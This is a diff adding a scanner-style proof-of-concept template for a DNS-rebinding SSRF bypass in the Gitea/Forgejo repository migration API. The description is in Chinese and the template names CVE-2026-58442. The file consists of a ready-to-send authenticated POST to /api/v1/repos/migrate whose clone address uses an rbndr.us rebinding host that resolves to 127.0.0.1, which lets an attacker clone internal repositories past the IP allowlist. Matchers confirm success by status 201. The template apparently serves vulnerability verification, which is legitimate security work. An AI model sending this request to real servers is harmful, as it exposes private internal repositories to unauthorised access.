@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "验证 Gitea/Forgejo 仓库迁移功能中 DNS 重绑定绕过 SSRF 过滤漏洞。通过使用 DNS 重绑定域名（如 rbndr.us），使验证阶段解析到公网 IP 通过检查，而 git clone 阶段重新解析到内网地址（127.0.0.1），从而绕过 IP 允许列表限制，克隆本应被阻止的内部仓库。"
+id = "POC-AVE-2026-0678"
+name = "Gitea 仓库迁移 DNS 重绑定 SSRF 绕过 PoC"
+severity = "medium"
+tags = ["ave-2026-0678"]
+vuln_id = [
+    "CVE-2026-58442",
+    "AVE-2026-0678",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/migrate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"clone_addr":"http://7f000001.03f821fc.rbndr.us:3000/owner/repo.git","repo_name":"poc-ssrf-test","uid":1,"service":"git","mirror":false}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{auth_token}}"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["id"]
